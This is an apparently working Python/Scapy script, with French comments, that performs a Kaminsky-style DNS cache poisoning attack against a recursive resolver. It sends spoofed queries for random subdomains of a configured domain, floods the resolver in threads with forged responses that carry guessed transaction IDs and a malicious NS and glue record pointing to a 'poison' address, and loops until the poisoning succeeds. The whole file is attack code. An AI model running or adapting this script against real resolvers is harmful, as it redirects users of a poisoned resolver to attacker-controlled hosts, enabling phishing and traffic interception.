
from scapy.all import *
import random
import time 
import threading
import sys 

#construire la question
def req() : 
	req =   IP(dst=target_recursive_dns_ip,src=fake_src2)/ \
		UDP(sport=random.randint(2000,3000), dport=53)/ \
		DNS(id=99,qr=0, 
        	    qd=DNSQR(qname=reqdomaine,  qtype="A", qclass=1),
        	  )
	send(req)

# construire la reponse correspondante 
def rep():
	
	ID=random.randint(1,65536)
	rep =   IP(dst=target_recursive_dns_ip,src=fake_src1)/ \
		UDP(sport=53, dport=dnsport)/ \
		DNS(id=ID,qr=1, 
        	   	qd=DNSQR(qname=reqdomaine,  qtype=1, qclass=1),
        	  	ns=DNSRR(rrname=reqdomaine, rclass=1, ttl=70000, rdata=host_name,type="NS"),
		  	ar=DNSRR(rrname=host_name,ttl = 77777,rdata=poison)
    				)
	print "[!] envois d'un poison  pour "+reqdomaine+" avec un ID="+str(ID) 
	send(rep,verbose=0)
#voir si ca  marche 
def check():
	print "[!] checking si  l'empoisonnement est fait" 
	req =   IP(dst=target_recursive_dns_ip,src=fake_src2)/ \
		UDP(sport=random.randint(2000,3000), dport=53)/ \
		DNS(id=99,qr=0, 
        	    qd=DNSQR(qname=reqdomaine,  qtype="A", qclass=1),
        	  )
	check = sr1(req,retry=0,timeout=3,verbose=0)
        try:
        	if check[DNS].an.rdata == poison:
            		print "[+] :) "
           		sys.exit(0)
    	except:
       		 print "[-] :( "
		 print "retry dans 2 secondes"
		 time.sleep(2) 	

def DNStester() :	
	print "+-----------------------------------------------------------+\n|\t\t\t\t\t\t\t    |\n|\t\t[++++++++++++++++++++]\t\t\t    |\n|target_recursive_dns_ip=126.0.0.31\t\t\t    |\n|poison=127.0.0.1\t\t\t\t\t    |\n|dnsport=5555\t\t\t\t\t\t    |\n|host_name=domain_hostname\t\t\t\t    |\n|domaine_de_base=domain\t\t\t\t    |\n|\t\t[++++++++++++++++++++]\t\t\t    |\n|\t\t\t\t\t\t\t    |\n+-----------------------------------------------------------+\n"
	global poison
	poison=raw_input("[!] poison = [\"127.0.0.1\"]") 
	poison="127.0.0.1"
	global target_recursive_dns_ip
	target_recursive_dns_ip=raw_input("[!] target_recursive_dns_ip = [\"127.0.0.31\"]") 
	target_recursive_dns_ip="127.0.0.31"


	global host_name
	host_name=raw_input("[!] host_name = [\"www.inpt.ac.ma\"]")
	host_name="www.inpt.ac.ma"
	global domaine_de_base
	domaine_de_base=raw_input("[!] domaine_de_base = [\"inpt.ac.ma\"]")
	domaine_de_base="inpt.ac.ma"



	global dnsport
	dnsport=5555
	global count
	count=1000
	global ID
	ID=1

	global fake_src1
	global fake_src2
	global reqdomaine 
	while True : 
		fake_src1=str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))
		fake_src2=str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))+"."+str(random.randint(1,192))
		reqdomaine="www"+str(count)+"."+domaine_de_base
		count=count+1

		req()
		threads=[]
		for i in range(0,20):
			t=threading.Thread(target=rep)
			threads.append(t)
			t.start()
		threads[19].join()		
		
		check()













 
